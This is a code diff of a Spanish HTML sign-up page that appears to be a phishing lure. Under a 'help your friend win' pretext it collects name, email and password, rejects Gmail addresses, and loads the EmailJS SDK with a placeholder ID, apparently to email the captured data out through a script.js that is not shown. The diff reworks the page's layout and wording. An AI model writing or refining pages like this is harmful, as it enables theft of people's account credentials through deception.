@@ -1,43 +1,44 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro de Licencias</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Registro de Licencias</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="fondo-dinamico"></div>
-    <div class="contenedor">
-        <div class="tarjeta">
-            <div class="cabecera">
-                <div class="icono">🔑</div>
-                <h1>Regístrate para ser a tu amigo ganador</h1>
-                <p>Verificación en 2 pasos</p>
-            </div>
-            <form id="formRegistro">
-                <div class="grupo-input">
-                    <input type="text" id="nombre" name="nombre" placeholder="Nombre completo" required>
-                </div>
-                <div class="grupo-input">
-                    <input type="email" id="correo" name="correo" placeholder="correo@ejemplo.com" required>
-                </div>
-                <div class="grupo-input">
-                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
-                </div>
-                <button type="submit">Validar Ahora →</button>
-            </form>
+  <div class="fondo"></div>
+  <main class="contenedor">
+    <div class="tarjeta">
+      <header class="cabecera">
+        <h1>Regístrate para que tu amigo tenga más posibilidades de ganar</h1>
+        <p>Es rápido, fácil y gratuito 🎉</p>
+      </header>
+      <form id="formRegistro" novalidate>
+        <div class="grupo">
+          <label for="nombre">Nombre completo</label>
+          <input type="text" id="nombre" name="nombre" required placeholder="Tu nombre">
         </div>
+        <div class="grupo">
+          <label for="correo">Correo electrónico</label>
+          <input type="email" id="correo" name="correo" required placeholder="correo@ejemplo.com">
+          <p class="error mail-error">No aceptamos correos de Gmail</p>
+        </div>
+        <div class="grupo">
+          <label for="password">Contraseña</label>
+          <input type="password" id="password" name="password" required placeholder="••••••••">
+        </div>
+        <button type="submit">Registrar</button>
+      </form>
     </div>
+  </main>
 
-    <!-- SDK EmailJS -->
-    <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
-    <script>
-        (function(){
-            emailjs.init('TU_USER_ID'); // Reemplaza con tu User ID de EmailJS
-        })();
-    </script>
-    <script src="app.js"></script>
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.emailjs.com/sdk/3.6.2/email.min.js"></script>
+  <script>
+    emailjs.init('TU_USER_ID'); // Reemplaza con tu user ID de EmailJS
+  </script>
+  <script src="script.js"></script>
 </body>
 </html>
